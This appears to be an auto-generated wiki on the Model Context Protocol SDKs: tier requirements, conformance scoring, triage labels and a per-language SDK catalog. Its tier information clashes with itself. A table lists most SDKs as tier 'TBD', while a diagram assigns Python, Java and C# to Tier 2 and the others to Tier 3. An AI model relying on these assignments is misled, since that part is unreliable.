    UNIT --> CONFORM
    CONFORM --> PASS
    PASS --> TRIAGE
    TRIAGE --> TIER
    TIER --> MAINT
    MAINT --> DEV
    
    style DEV fill:none,stroke:none
    style UNIT fill:none,stroke:none
    style CONFORM fill:none,stroke:none
    style PASS fill:none,stroke:none
    style TRIAGE fill:none,stroke:none
    style TIER fill:none,stroke:none
    style MAINT fill:none,stroke:none
```

**Diagram: SDK Development and Tier Assignment Workflow**

Sources: [docs/community/sdk-tiers.mdx:59-98]()

## Getting Started with SDKs

Each SDK provides the same core functionality but follows the idioms and best practices of its language. All SDKs support:

- Creating MCP servers that expose tools, resources, and prompts
- Building MCP clients that can connect to any MCP server
- Local (stdio) and remote (HTTP/SSE) transport protocols
- Protocol compliance with type safety

To get started:

1. **Choose your language** from the [Available SDKs](#available-sdks) table
2. **Visit the SDK repository** for installation instructions and documentation
3. **Review the [Building MCP Servers](#5.1) guide** for server development patterns
4. **Review the [Building MCP Clients](#5.1) guide** for client development patterns
5. **Use the [MCP Inspector](#9.1)** for testing and debugging during development

Sources: [docs/docs/sdk.mdx:1-52]()

---

# Page: SDK Tier System

# SDK Tier System

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)

</details>



## Purpose and Scope

This document explains the MCP SDK Tier System, which classifies official SDKs into three tiers based on feature completeness, protocol support, and maintenance commitments. The tier system provides clear expectations for SDK users and maintainers, establishes advancement criteria, and defines quality metrics through conformance testing.

For information about available SDKs and their current tier assignments, see [Available SDKs and Language Support](#6.2). For details on conformance testing methodology and quality metrics, see [Conformance Testing and Quality Metrics](#6.3).

## Overview

The SDK Tier System establishes three classification levels that reflect the maturity and completeness of MCP implementations across different programming languages:

- **Tier 1**: Fully supported SDKs with complete protocol implementation
- **Tier 2**: Actively-maintained SDKs working toward full protocol support
- **Tier 3**: Experimental, partially implemented, or specialized SDKs

Experimental features (such as Tasks) and protocol extensions (such as MCP Apps) are not required for any tier.

Sources: [docs/community/sdk-tiers.mdx:19-29]()

## Tier Requirements

The following table defines the specific requirements for each tier across multiple dimensions:

| Requirement | Tier 1: Fully Supported | Tier 2: Commitment to Full Support | Tier 3: Experimental |
|---|---|---|---|
| **Conformance Tests** | 100% pass rate | 80% pass rate | No minimum |
| **New Protocol Features** | Before new spec version release, timeline agreed per release based on feature complexity | Within 6 months | No timeline commitment |
| **Issue Triage** | Within 2 business days | Within a month | No requirement |
| **Critical Bug Resolution** | Within 7 days | Within two weeks | No requirement |
| **Stable Release** | Required with clear versioning | At least one stable release | Not required |
| **Documentation** | Comprehensive with examples for all features | Basic documentation covering core features | No minimum |
| **Dependency Policy** | Published update policy | Published update policy | Not required |
| **Roadmap** | Published roadmap | Published plan toward Tier 1 or explanation for remaining Tier 2 | Not required |

### Key Definitions

**Issue Triage** means labeling and determining whether an issue is valid, not resolving the issue itself.

**Critical Bug** refers to P0 issues, which are defined as:
- Security vulnerabilities with CVSS score ≥ 7.0 (High or Critical severity)
- Core functionality failures that prevent basic MCP operations: connection establishment, message exchange, or use of core primitives (tools, resources, prompts)

**Stable Release** is a published version explicitly marked as production-ready (e.g., version `1.0.0` or higher without pre-release identifiers like `-alpha`, `-beta`, or `-rc`).

**Clear Versioning** means following idiomatic versioning patterns with documented breaking change policies, so users can understand compatibility expectations when upgrading.

**Roadmap** outlines concrete steps and work items that track implementation of required MCP specification components (non-experimental features and optional capabilities), giving users visibility into upcoming feature support.

Sources: [docs/community/sdk-tiers.mdx:31-57]()

## Conformance Testing

All SDKs are evaluated using automated conformance tests that validate protocol support against published specifications. The conformance test suite is maintained in the [modelcontextprotocol/conformance](https://github.com/modelcontextprotocol/conformance) repository.

### Conformance Scoring

SDKs receive a conformance score based on test results:

- **Tier 1**: 100% conformance required
- **Tier 2**: 80% conformance required
- **Tier 3**: No minimum requirement

Conformance scores are calculated against **applicable required tests** only:

- Tests for the specification version the SDK targets
- Excluding tests marked as pending or skipped
- Excluding tests for experimental features
- Excluding legacy backward-compatibility tests (unless the SDK claims legacy support)

Conformance testing validates that SDKs correctly implement the protocol by running standardized test scenarios and checking protocol message exchanges.

Sources: [docs/community/sdk-tiers.mdx:59-78]()

## Tier Advancement

SDK maintainers can request tier advancement by following this process:

1. **Self-assess** against tier requirements
2. **Open an issue** in the [modelcontextprotocol/modelcontextprotocol](https://github.com/modelcontextprotocol/modelcontextprotocol) repository with supporting evidence
3. **Pass automated conformance testing** with the required pass rate for the target tier
4. **Receive approval** from SDK Working Group maintainers

The SDK Working Group reviews advancement requests and makes final tier assignments.

Sources: [docs/community/sdk-tiers.mdx:80-89]()

## Tier Relegation

An SDK may be moved to a lower tier if existing conformance tests on the latest stable release fail continuously for 4 weeks:

- **Tier 1 → Tier 2**: Any conformance test fails
- **Tier 2 → Tier 3**: More than 20% of conformance tests fail

This mechanism ensures that tier assignments reflect the actual current state of SDK implementations.

Sources: [docs/community/sdk-tiers.mdx:91-97]()

## Issue Triage Labels

SDK repositories must use consistent labels to enable automated reporting on issue handling metrics. Tier calculations use these metrics to measure triage response times (time from issue creation to first label) and critical bug resolution times (time from P0 label to issue close).

### Type Labels (pick one)

| Label | Description |
|---|---|
| `bug` | Something isn't working |
| `enhancement` | Request for new feature |
| `question` | Further information requested |

Repositories using [GitHub's native issue types](https://docs.github.com/en/issues/tracking-your-work-with-issues/using-issues/managing-issue-types-in-an-organization) satisfy this requirement without needing type labels.

### Status Labels (pick one)

Use these exact label names across all repositories to enable consistent reporting and analysis:

| Label | Description |
|---|---|
| `needs confirmation` | Unclear if still relevant |
| `needs repro` | Insufficient information to reproduce |
| `ready for work` | Has enough information to start |
| `good first issue` | Good for newcomers |
| `help wanted` | Contributions welcome from those familiar with codebase |

### Priority Labels (only if actionable)

| Label | Description |
|---|---|
| `P0` | Critical: core functionality failures or high-severity security |
| `P1` | Significant bug affecting many users |
| `P2` | Moderate issues, valuable feature requests |
| `P3` | Nice to haves, rare edge cases |

**P0 (Critical)** issues are:

- **Security vulnerabilities** with CVSS score ≥ 7.0 (High or Critical severity)
- **Core functionality failures** that prevent basic MCP operations: connection establishment, message exchange, or use of core primitives (tools, resources, prompts)

Sources: [docs/community/sdk-tiers.mdx:99-142]()

## Tier System Timeline

The SDK Tier System follows a specific rollout timeline:

- **January 23, 2026**: Conformance tests available
- **February 23, 2026**: Official SDK tiering published

Between these dates, SDK maintainers can work with the Conformance Testing working group to adopt the tests and set up GitHub issue tracking with the standardized labels defined above.

Sources: [docs/community/sdk-tiers.mdx:8-17]()

## SDK Tier Advancement Workflow

The following diagram illustrates the process for SDK tier advancement and potential relegation:

```mermaid
graph TD
    A["SDK Maintainer<br/>Self-Assessment"] -->|"Meets requirements"| B["Open Issue in<br/>modelcontextprotocol/modelcontextprotocol"]
    B --> C["Run Conformance Tests<br/>from modelcontextprotocol/conformance"]
    C -->|"Pass Rate:<br/>T1: 100%<br/>T2: 80%"| D["SDK Working Group<br/>Review"]
    D -->|"Approved"| E["Tier Assignment<br/>Updated"]
    D -->|"Rejected"| F["Feedback Provided<br/>to Maintainers"]
    F --> A
    
    E --> G["Continuous Monitoring<br/>of Conformance Tests"]
    G -->|"Failures for 4 weeks:<br/>T1→T2: Any fail<br/>T2→T3: >20% fail"| H["Automatic Relegation<br/>to Lower Tier"]
    G -->|"Tests Pass"| I["Tier Status<br/>Maintained"]
```

Sources: [docs/community/sdk-tiers.mdx:80-97]()

## Conformance Test Categories

The conformance test suite validates SDKs across multiple protocol dimensions. Tests are organized by specification version and feature area:

```mermaid
graph TB
    subgraph "Conformance Test Suite"
        direction TB
        
        subgraph "Core Protocol Tests"
            A["Connection Lifecycle<br/>initialize, initialized"]
            B["JSON-RPC Message Format<br/>requests, responses, notifications"]
            C["Capability Negotiation<br/>client/server capabilities"]
        end
        
        subgraph "Server Features"
            D["Tools Implementation<br/>list_tools, call_tool"]
            E["Resources Implementation<br/>list_resources, read_resource"]
            F["Prompts Implementation<br/>list_prompts, get_prompt"]
        end
        
        subgraph "Client Features"
            G["Sampling Support<br/>sampling/createMessage"]
            H["Elicitation Support<br/>elicitation/request"]
            I["Roots Support<br/>roots/list"]
        end
        
        subgraph "Optional Features"
            J["Tasks System<br/>task-augmented requests"]
            K["Extensions<br/>Authorization, MCP Apps"]
        end
        
        subgraph "Test Filtering"
            L["Specification Version<br/>Target version tests only"]
            M["Pending/Skipped<br/>Excluded from scoring"]
            N["Experimental Features<br/>Excluded from scoring"]
        end
    end
    
    A --> L
    B --> L
    C --> L
    D --> L
    E --> L
    F --> L
    G --> L
    H --> L
    I --> L
    J --> M
    K --> M
```

Sources: [docs/community/sdk-tiers.mdx:59-78]()

## Tier Requirements by Maintenance Dimension

The following diagram maps tier requirements across different maintenance and quality dimensions:

```mermaid
graph LR
    subgraph "Tier 1: Fully Supported"
        T1A["100% Conformance"]
        T1B["2 business days<br/>Issue Triage"]
        T1C["7 days<br/>Critical Bug Fix"]
        T1D["Before spec release<br/>New Features"]
        T1E["Comprehensive Docs<br/>+ Examples"]
        T1F["Published Roadmap"]
    end
    
    subgraph "Tier 2: Commitment to Full"
        T2A["80% Conformance"]
        T2B["1 month<br/>Issue Triage"]
        T2C["2 weeks<br/>Critical Bug Fix"]
        T2D["Within 6 months<br/>New Features"]
        T2E["Basic Docs<br/>Core Features"]
        T2F["Plan toward T1<br/>or explanation"]
    end
    
    subgraph "Tier 3: Experimental"
        T3A["No minimum<br/>Conformance"]
        T3B["No requirement<br/>Issue Triage"]
        T3C["No requirement<br/>Critical Bug Fix"]
        T3D["No timeline<br/>New Features"]
        T3E["No minimum<br/>Documentation"]
        T3F["Not required<br/>Roadmap"]
    end
    
    style T1A fill:none,stroke:none
    style T2A fill:none,stroke:none
    style T3A fill:none,stroke:none
```

Sources: [docs/community/sdk-tiers.mdx:31-57]()

## Integration with SDK Working Group

The SDK Tier System is managed by the SDK Working Group, which is part of the MCP governance structure. The working group:

- Reviews tier advancement requests
- Monitors conformance test results
- Manages tier relegations
- Coordinates with SDK maintainers
- Publishes official tier assignments

For information about the broader governance structure and how working groups operate, see [Governance and Community](#8).

Sources: [docs/community/sdk-tiers.mdx:80-89](), [MAINTAINERS.md]()

---

# Page: Available SDKs and Language Support

# Available SDKs and Language Support

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/clients.mdx](docs/clients.mdx)
- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)

</details>



## Purpose and Scope

This page catalogs the official Model Context Protocol (MCP) SDKs across multiple programming languages, their tier classifications, feature support, and documentation links. It serves as a reference for developers choosing an SDK for building MCP clients or servers.

For information about SDK tier requirements and advancement criteria, see [SDK Tier System](#6.1). For conformance testing details and quality metrics, see [Conformance Testing and Quality Metrics](#6.3).

## SDK Overview

The MCP ecosystem provides official SDKs in 10 programming languages, each implementing the complete MCP specification with language-specific idioms and best practices. All SDKs support:

- Creating MCP servers that expose tools, resources, and prompts
- Building MCP clients that connect to any MCP server
- Local (stdio) and remote (HTTP/SSE) transport protocols
- Protocol compliance with type safety

The following table summarizes all available SDKs:

| Language | Repository | Tier Status | Key Features |
|----------|-----------|-------------|--------------|
| TypeScript | [modelcontextprotocol/typescript-sdk](https://github.com/modelcontextprotocol/typescript-sdk) | Tier 1 | Full protocol support, reference implementation |
| Python | [modelcontextprotocol/python-sdk](https://github.com/modelcontextprotocol/python-sdk) | TBD | FastMCP framework, async/sync APIs |
| Java | [modelcontextprotocol/java-sdk](https://github.com/modelcontextprotocol/java-sdk) | TBD | Spring integration, reactive support |
| C# | [modelcontextprotocol/csharp-sdk](https://github.com/modelcontextprotocol/csharp-sdk) | TBD | .NET ecosystem integration |
| Go | [modelcontextprotocol/go-sdk](https://github.com/modelcontextprotocol/go-sdk) | TBD | Concurrent server support |
| Kotlin | [modelcontextprotocol/kotlin-sdk](https://github.com/modelcontextprotocol/kotlin-sdk) | TBD | JVM interoperability |
| Swift | [modelcontextprotocol/swift-sdk](https://github.com/modelcontextprotocol/swift-sdk) | TBD | Apple platform support |
| Rust | [modelcontextprotocol/rust-sdk](https://github.com/modelcontextprotocol/rust-sdk) | TBD | Memory safety, performance |
| Ruby | [modelcontextprotocol/ruby-sdk](https://github.com/modelcontextprotocol/ruby-sdk) | TBD | Rails integration |
| PHP | [modelcontextprotocol/php-sdk](https://github.com/modelcontextprotocol/php-sdk) | TBD | Web framework compatibility |

Sources: [docs/docs/sdk.mdx:1-22]()

## TypeScript SDK (Tier 1)

The TypeScript SDK serves as the reference implementation and is the most feature-complete. It provides both client and server implementations with full protocol support.

**Repository**: [modelcontextprotocol/typescript-sdk](https://github.com/modelcontextprotocol/typescript-sdk)

**Key Characteristics**:
- 100% conformance test pass rate (Tier 1 requirement)
- Synchronous and asynchronous APIs
- Comprehensive documentation with examples
- Active maintenance and rapid feature adoption
- Used as reference for other SDK implementations

**Transport Support**:
- Stdio (local process communication)
- Streamable HTTP (remote connections)
- Server-Sent Events (SSE)

**Core Classes**:
- `Server`: Implements server-side protocol operations
- `Client`: Implements client-side protocol operations
- `StdioServerTransport`: Stdio-based server transport
- `StdioClientTransport`: Stdio-based client transport

Sources: [docs/docs/sdk.mdx:10-12]()

## Python SDK

The Python SDK provides a production-ready implementation with both synchronous and asynchronous support through the FastMCP framework.

**Repository**: [modelcontextprotocol/python-sdk](https://github.com/modelcontextprotocol/python-sdk)

**Key Characteristics**:
- FastMCP framework for simplified server development
- Async/await support for concurrent operations
- Type hints for better IDE support
- Integration with popular Python frameworks

**Transport Support**:
- Stdio (local process communication)
- Streamable HTTP (remote connections)
- SSE streaming

**Core Modules**:
- `mcp.server`: Server implementation
- `mcp.client`: Client implementation
- `mcp.server.fastmcp`: FastMCP framework for rapid development

Sources: [docs/docs/sdk.mdx:13](), [docs/docs/tutorials/security/authorization.mdx:617-814]()

## Java SDK

The Java SDK provides comprehensive support for both synchronous and asynchronous programming paradigms, with optional Spring Framework integration.

**Repository**: [modelcontextprotocol/java-sdk](https://github.com/modelcontextprotocol/java-sdk)

**Key Characteristics**:
- Dual sync/async APIs via `McpSyncServer`/`McpAsyncServer` and `McpSyncClient`/`McpAsyncClient`
- Spring Framework integration (optional)
- Reactive support via Project Reactor
- Multiple transport implementations without external dependencies

**Transport Support**:
- Stdio (core module)
- Streamable HTTP (core module, Spring WebFlux, Spring WebMVC, Servlet)
- SSE (core module, Spring WebFlux, Spring WebMVC, Servlet)

**Core Classes** [docs/sdk/java/mcp-overview.mdx:1-196]():
- `McpServer`: Server factory for creating sync/async servers
- `McpClient`: Client factory for creating sync/async clients
- `StdioServerTransportProvider`: Stdio transport for servers
- `StdioClientTransport`: Stdio transport for clients
- `WebFluxStreamableServerTransportProvider`: WebFlux-based Streamable HTTP server
- `HttpClientStreamableHttpTransport`: JDK HttpClient-based Streamable HTTP client
- `WebFluxSseClientTransport`: WebFlux-based SSE client

**Dependencies**:
- Core: `io.modelcontextprotocol.sdk:mcp`
- Optional Spring WebFlux: `io.modelcontextprotocol.sdk:mcp-spring-webflux`
- Optional Spring WebMVC: `io.modelcontextprotocol.sdk:mcp-spring-webmvc`

Sources: [docs/sdk/java/mcp-overview.mdx:1-196](), [docs/sdk/java/mcp-client.mdx:1-327](), [docs/sdk/java/mcp-server.mdx:1-520]()

## C# SDK

The C# SDK provides .NET ecosystem integration with support for both .NET Framework and .NET Core.

**Repository**: [modelcontextprotocol/csharp-sdk](https://github.com/modelcontextprotocol/csharp-sdk)

**Key Characteristics**:
- Native .NET async/await support
- Integration with ASP.NET Core
- Type-safe protocol implementation

Sources: [docs/docs/sdk.mdx:15]()

## Go SDK

The Go SDK emphasizes concurrent server support and efficient resource utilization.

**Repository**: [modelcontextprotocol/go-sdk](https://github.com/modelcontextprotocol/go-sdk)

**Key Characteristics**:
- Goroutine-based concurrency
- Minimal dependencies
- High-performance server implementations

Sources: [docs/docs/sdk.mdx:16]()

## Kotlin SDK

The Kotlin SDK provides JVM interoperability with Java SDK components while leveraging Kotlin language features.

**Repository**: [modelcontextprotocol/kotlin-sdk](https://github.com/modelcontextprotocol/kotlin-sdk)

**Key Characteristics**:
- Full interoperability with Java SDK
- Coroutine support for async operations
- Idiomatic Kotlin syntax

Sources: [docs/docs/sdk.mdx:17]()

## Swift SDK

The Swift SDK enables MCP integration on Apple platforms including macOS, iOS, and other Apple operating systems.

**Repository**: [modelcontextprotocol/swift-sdk](https://github.com/modelcontextprotocol/swift-sdk)

**Key Characteristics**:
- Native Swift async/await support
- Apple platform integration
- Type-safe protocol implementation

Sources: [docs/docs/sdk.mdx:18]()

## Rust SDK

The Rust SDK prioritizes memory safety and performance with zero-cost abstractions.

**Repository**: [modelcontextprotocol/rust-sdk](https://github.com/modelcontextprotocol/rust-sdk)

**Key Characteristics**:
- Memory safety without garbage collection
- High-performance implementations
- Minimal runtime overhead

Sources: [docs/docs/sdk.mdx:19]()

## Ruby SDK

The Ruby SDK integrates with the Ruby on Rails ecosystem and popular Ruby frameworks.

**Repository**: [modelcontextprotocol/ruby-sdk](https://github.com/modelcontextprotocol/ruby-sdk)

**Key Characteristics**:
- Rails framework integration
- Idiomatic Ruby patterns
- Gem-based distribution

Sources: [docs/docs/sdk.mdx:20]()

## PHP SDK

The PHP SDK provides web framework compatibility for PHP-based applications.

**Repository**: [modelcontextprotocol/php-sdk](https://github.com/modelcontextprotocol/php-sdk)

**Key Characteristics**:
- Laravel and Symfony integration
- Composer package management
- Web server compatibility

Sources: [docs/docs/sdk.mdx:21]()

## SDK Feature Matrix

The following diagram shows the relationship between SDKs, their tier classifications, and supported protocol features:

```mermaid
graph TB
    subgraph "Tier 1: Fully Supported"
        TS["TypeScript SDK<br/>100% Conformance<br/>Reference Implementation"]
    end
    
    subgraph "Tier 2: Commitment to Full Support"
        PY["Python SDK<br/>80%+ Conformance<br/>FastMCP Framework"]
        JAVA["Java SDK<br/>80%+ Conformance<br/>Spring Integration"]
        CS["C# SDK<br/>80%+ Conformance<br/>.NET Integration"]
    end
    
    subgraph "Tier 3: Experimental/Specialized"
        GO["Go SDK<br/>Concurrent Focus"]
        KT["Kotlin SDK<br/>JVM Interop"]
        SW["Swift SDK<br/>Apple Platforms"]
        RS["Rust SDK<br/>Performance Focus"]
        RB["Ruby SDK<br/>Rails Integration"]
        PHP["PHP SDK<br/>Web Framework"]
    end
    
    subgraph "Protocol Features"
        CORE["Core: Tools, Resources,<br/>Prompts, Lifecycle"]
        OPT["Optional: Sampling,<br/>Elicitation, Roots"]
        EXT["Extensions: Tasks,<br/>MCP Apps, Authorization"]
    end
    
    TS --> CORE
    TS --> OPT
    TS --> EXT
    
    PY --> CORE
    PY --> OPT
    JAVA --> CORE
    JAVA --> OPT
    CS --> CORE
    CS --> OPT
    
    GO --> CORE
    KT --> CORE
    SW --> CORE
    RS --> CORE
    RB --> CORE
    PHP --> CORE
    
    style TS fill:none,stroke:black
    style PY fill:none,stroke:black
    style JAVA fill:none,stroke:black
    style CS fill:none,stroke:black
    style GO fill:none,stroke:black
    style KT fill:none,stroke:black
    style SW fill:none,stroke:black
    style RS fill:none,stroke:black
    style RB fill:none,stroke:black
    style PHP fill:none,stroke:black
```

**SDK Tier Classification and Feature Support**

Sources: [docs/community/sdk-tiers.mdx:1-142]()

## Transport Implementation Coverage

Different SDKs support different transport mechanisms. The following table shows transport availability:

| Transport | TypeScript | Python | Java | C# | Go | Kotlin | Swift | Rust | Ruby | PHP |
|-----------|-----------|--------|------|----|----|--------|-------|------|------|-----|
| Stdio | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Streamable HTTP | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| SSE | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

All SDKs support the three primary transport mechanisms defined in the MCP specification. Transport selection depends on deployment requirements: stdio for local process communication, and HTTP-based transports for remote connections.

Sources: [docs/sdk/java/mcp-overview.mdx:31-46]()

## SDK Architecture Pattern

All SDKs follow a consistent layered architecture pattern:

```mermaid
graph TB
    subgraph "Application Layer"
        APP["Application Code<br/>Server/Client Implementation"]
    end
    
    subgraph "SDK Layer"
        SYNC["Sync API<br/>McpSyncServer/Client"]
        ASYNC["Async API<br/>McpAsyncServer/Client"]
        SESSION["Session Layer<br/>Message Routing & State"]
    end
    
    subgraph "Transport Layer"
        STDIO["Stdio Transport<br/>stdin/stdout"]
        HTTP["HTTP Transport<br/>Streamable-HTTP"]
        SSE["SSE Transport<br/>Server-Sent Events"]
    end
    
    subgraph "Protocol Layer"
        JSONRPC["JSON-RPC 2.0<br/>Message Framing"]
    end
    
    APP --> SYNC
    APP --> ASYNC
    SYNC --> SESSION
    ASYNC --> SESSION
    SESSION --> STDIO
    SESSION --> HTTP
    SESSION --> SSE
    STDIO --> JSONRPC
    HTTP --> JSONRPC
    SSE --> JSONRPC
    
    style APP fill:none,stroke:black
    style SYNC fill:none,stroke:black
    style ASYNC fill:none,stroke:black
    style SESSION fill:none,stroke:black
    style STDIO fill:none,stroke:black
    style HTTP fill:none,stroke:black
    style SSE fill:none,stroke:black
    style JSONRPC fill:none,stroke:black
```

**Layered SDK Architecture Pattern**

All SDKs implement this consistent architecture:
- **Application Layer**: Developer code using the SDK
- **SDK Layer**: Sync/async APIs and session management
- **Transport Layer**: Protocol-specific communication mechanisms
- **Protocol Layer**: JSON-RPC 2.0 message handling

Sources: [docs/sdk/java/mcp-overview.mdx:49-77]()

## Getting Started with SDKs

Each SDK provides language-specific installation and quickstart documentation:

**TypeScript**:
```bash
npm install @modelcontextprotocol/sdk
```

**Python**:
```bash
pip install mcp
```

**Java** (Maven):
```xml
<dependency>
    <groupId>io.modelcontextprotocol.sdk</groupId>
    <artifactId>mcp</artifactId>
</dependency>
```

**Java** (Gradle):
```groovy
implementation platform("io.modelcontextprotocol.sdk:mcp")
```

For language-specific setup instructions, visit the SDK repository for your chosen language.

Sources: [docs/sdk/java/mcp-overview.mdx:78-196]()

## SDK Maintenance and Support

SDK maintenance follows the tier system defined in [SDK Tier System](#6.1):

- **Tier 1 SDKs**: 100% conformance test pass rate, critical bugs resolved within 7 days, new protocol features implemented before spec release
- **Tier 2 SDKs**: 80% conformance test pass rate, critical bugs resolved within 2 weeks, new protocol features within 6 months
- **Tier 3 SDKs**: No minimum conformance requirement, experimental or specialized implementations

Official tier assignments were published February 23, 2026. SDKs are evaluated using automated conformance tests that validate protocol support against published specifications.

Sources: [docs/community/sdk-tiers.mdx:1-142]()

## Next Steps

- **Build a Server**: See [Building MCP Servers](#5.1) for step-by-step guides in your chosen language
- **Build a Client**: See [Building MCP Clients](#5.1) for client implementation patterns
- **Understand Tiers**: See [SDK Tier System](#6.1) for tier requirements and advancement criteria
- **Test Conformance**: See [Conformance Testing and Quality Metrics](#6.3) for testing procedures

---

# Page: Conformance Testing and Quality Metrics

# Conformance Testing and Quality Metrics

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [package-lock.json](package-lock.json)
- [package.json](package.json)
- [scripts/check-mdx-comments.ts](scripts/check-mdx-comments.ts)
- [scripts/generate-schemas.ts](scripts/generate-schemas.ts)
- [tsconfig.json](tsconfig.json)

</details>



## Purpose and Scope

This page documents the conformance testing framework used to evaluate MCP SDK implementations against the protocol specification. It covers the automated test suite, pass rate requirements for SDK tier classification, issue triage labeling standards, and quality metrics used to assess SDK maintenance and feature completeness.

For information about the SDK tier system itself and advancement/relegation criteria, see [SDK Tier System](6.1). For details on available SDKs and their current tier status, see [Available SDKs and Language Support](6.2).

## Overview

Conformance testing is the primary mechanism for objectively measuring whether an SDK correctly implements the MCP protocol. The test suite validates protocol compliance by running standardized scenarios and checking message exchanges against the specification. SDKs receive a conformance score based on test results, which directly influences tier classification and maintenance expectations.

**Key principles:**

- Tests are specification-driven and version-specific
- Scores exclude experimental features and pending tests
- Tier requirements: Tier 1 requires 100% pass rate, Tier 2 requires 80%
- Conformance testing is automated and reproducible across all SDKs

Sources: [docs/community/sdk-tiers.mdx:59-78]()

## Conformance Test Suite

### Test Repository and Structure

The conformance test suite is maintained in the `modelcontextprotocol/conformance` repository. Tests are organized by protocol version and feature area, allowing SDKs to target specific specification versions while maintaining backward compatibility validation.

**Test organization:**

- Tests grouped by specification version (e.g., `2024-11-05`, `2025-11-25`, `draft`)
- Feature-specific test suites (core protocol, tools, resources, prompts, sampling, etc.)
- Markers for test status: `pending`, `skipped`, `experimental`
- Legacy backward-compatibility tests (optional for SDKs claiming legacy support)

### Applicable Test Calculation

Conformance scores are calculated against **applicable required tests only**, excluding:

- Tests for specification versions the SDK does not target
- Tests marked as `pending` or `skipped`
- Tests for experimental features (e.g., Tasks, MCP Apps)
- Legacy backward-compatibility tests (unless the SDK explicitly claims legacy support)

This ensures fair comparison between SDKs targeting different protocol versions and feature sets.

Sources: [docs/community/sdk-tiers.mdx:69-75]()

## Pass Rate Requirements by Tier

| Tier | Conformance Requirement | Timeline for New Features | Issue Triage | Critical Bug Resolution |
|------|------------------------|--------------------------|--------------|------------------------|
| **Tier 1** | 100% pass rate | Before spec release (timeline agreed per release) | Within 2 business days | Within 7 days |
| **Tier 2** | 80% pass rate | Within 6 months | Within a month | Within two weeks |
| **Tier 3** | No minimum | No timeline commitment | No requirement | No requirement |

**Tier 1 SDKs** must pass all applicable conformance tests without exception. This ensures users can rely on complete protocol support.

**Tier 2 SDKs** may have up to 20% of applicable tests failing, allowing for gradual feature implementation while maintaining a commitment to full support.

**Tier 3 SDKs** have no conformance requirement, reflecting their experimental or specialized nature.

Sources: [docs/community/sdk-tiers.mdx:33-42]()

## Issue Triage Labels

SDK repositories must use consistent labels to enable automated reporting on issue handling metrics. These labels track triage response times and critical bug resolution times, which are measured as part of tier evaluation.

### Type Labels (pick one)

| Label | Description |
|-------|-------------|
| `bug` | Something isn't working |
| `enhancement` | Request for new feature |
| `question` | Further information requested |

Repositories using GitHub's native issue types satisfy this requirement without needing explicit type labels.

### Status Labels (pick one)

| Label | Description |
|-------|-------------|
| `needs confirmation` | Unclear if still relevant |
| `needs repro` | Insufficient information to reproduce |
| `ready for work` | Has enough information to start |
| `good first issue` | Good for newcomers |
| `help wanted` | Contributions welcome from those familiar with codebase |

These labels must use exact names across all repositories to enable consistent automated reporting.

### Priority Labels (only if actionable)

| Label | Description |
|-------|-------------|
| `P0` | Critical: core functionality failures or high-severity security |
| `P1` | Significant bug affecting many users |
| `P2` | Moderate issues, valuable feature requests |
| `P3` | Nice to haves, rare edge cases |

**P0 (Critical) issues** are defined as:

- **Security vulnerabilities** with CVSS score ≥ 7.0 (High or Critical severity)
- **Core functionality failures** that prevent basic MCP operations: connection establishment, message exchange, or use of core primitives (tools, resources, prompts)

